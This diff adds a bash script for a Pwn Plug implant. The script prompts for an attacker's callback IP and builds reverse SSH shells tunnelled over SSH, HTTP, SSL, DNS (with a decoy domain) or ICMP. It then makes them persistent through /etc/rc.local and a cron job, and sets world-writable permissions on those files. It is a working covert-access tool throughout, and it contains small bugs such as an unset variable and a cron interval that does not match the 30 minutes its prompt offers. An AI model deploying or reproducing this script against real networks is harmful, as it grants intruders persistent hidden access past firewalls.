@@ -1,0 +1,55 @@
+#! /bin/bash
+mkdir -p /var/pwnplug/reverseshell/
+reverse_shell=/var/pwnplug/reverseshell/reverseshell.sh
+mv "$reverse_shell" /var/pwnplug/reverseshell/reverseshell.bak
+default=all
+echo "This script assumes that you have taken the steps to set up your host (who you want to connect back to as outlined in the www.securitygeneration.com scripts"
+read -p "First we will need to know who to connect back to? " -e hostip
+echo "$testip"
+counter=1
+while [ $counter -gt 0 ]; do
+read -p "Now that we have the address, $hostip, what type of tunnel would you like to set up? Choices are: SSH, HTTP, SSL, DNS, ICMP, or All (default=All) " -e t1
+if [ -n "$t1" ]
+	then
+	scantype=$t1
+	else
+	scantype=$default
+fi
+case "$scantype" in 
+all|All|ALL)
+echo "Creating all the reverse shells in the script";echo "killall ptunnel; killall stunnel4; killall dns2tcpc; killall ssh" >>"$reverse_shell"; echo "ssh -NR 3333:localhost:22 -i /root/.ssh/id_rsa pwnplug@"$hostip" -p 22 &" >> "$reverse_shell";echo "htc -F 8081 "$hostip":80 &" >> "$reverse_shell"; echo "ssh -NR 3338:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 8081 &">> "$reverse_shell";echo "stunnel -c -d 4321 -r "$hostip":443 &">>"$reverse_shell"; echo "sleep 10";  echo "ssh -NR 3336:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 4321 &">>"$reverse_shell";echo "dns2tcpc -r ssh -l 5432 -z rssfeeds.com "$hostip" &">>"$reverse_shell"; echo "ssh -NR 3335:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 5432 &">>"$reverse_shell";echo "ptunnel -lp 7654 -p "$hostip" -da "$hostip" -dp 22 -c eth0 &">>"$reverse_shell"; echo "ssh -NR 3339:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 7654 &">>"$reverse_shell"; chmod 777 "$reverse_shell"; counter=-1;;
+ssh|SSH|SSh|Ssh)
+echo "OK creating an ssh reverse shell";echo "ssh -NR 3333:localhost:22 -i /root/.ssh/id_rsa pwnplug@"$hostip" -p 22" > "$reverse_shell"; chmod 777 "$reverse_shell";counter=-1;;
+http|HTTP|Http)
+echo "OK creating a reverse ssh shell over http"; echo "htc -F 8081 "$hostip":80&" > "$reverse_shell"; echo "ssh -NR 3338:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 8081 &">> "$reverse_shell";chmod 777 "$reverse_shell"; counter=-1;;
+SSL|ssl|Ssl)
+echo "OK creating a reverse ssh shell over https"; echo "stunnel -c -d 4321 -r "$hostip":443 &">"$reverse_shell"; echo "sleep 10"; echo "ssh -NR 3336:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 4321 &">>"$reverse_shell"; chmod 777 "$reverse_shell"; counter=-1;;
+DNS|dns|Dns)
+echo "OK creating a reverse ssh shell over DNS"; echo "dns2tcpc -r ssh -l 5432 -z rssfeeds.com "$hostip"">>"$reverse_shell &"; echo "ssh -NR 3335:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 5432 &">>"$reverse_shell";chmod 777 "$reverse_shell";counter=-1;;
+ICMP|icmp|Icmp)
+echo "Ok setting up a reverse ssh shell over icmp"; echo "ptunnel -lp 7654 -p "$hostip" -da "$hostip" -dp 22 -c eth0 &">"$reverse_shell"; echo "ssh -NR 3339:localhost:22 -i /root/.ssh/id_rsa pwnplug@localhost -p 7654 &">>"$reverse_shell"; chmod 777 "$reverse_shell"; counter=-1;;
+exit|EXIT|Exit|quit|QUIT|Quit)
+break;connect=-1;;
+*) 
+echo "Sorry I didn't understand your input. Please try again. ";;
+esac
+done
+while [ $counter -lt 0 ]; do
+read -p "Shell done! Now we have to run get the plug to run it for the shell to be effective. Do you want it to run at boot, every 30 minutes, or both? Please enter Boot, 30, or Both (default=Boot) " -e t2
+if [ -n "$t2" ]
+	then
+	whenrun=$t2
+	else
+	whenrun=boot
+fi
+case "$whenrun" in
+Boot|BOOT|boot)
+mv /etc/rc.local /etc/rc.local.orig; sed '$ i\/var/pwnplug/reverseshell/reverseshell.sh' /etc/rc.local.orig >/etc/rc.local; chmod 777 /etc/rc.local;counter=1;;
+30|thirty|Thirty) 
+(crontab -l;echo "*/15 * * * * /var/pwnplug/reverseshell/reverseshell.sh") |crontab -;counter=1;;
+both|Both|BOTH)
+mv /etc/rc.local /etc/rc.local.orig; sed '$ i\/var/pwnplug/reverseshell/reverseshell.sh' /etc/rc.local.orig >/etc/rc.local; chmod 777 /etc/rc.local;(crontab -l;echo "*/15 * * * * /var/pwnplug/reverseshell/reverseshell.sh") |crontab -;counter=1;;
+*) 
+echo "Sorry I didn't understand your input. Please try again. ";;
+esac
+done
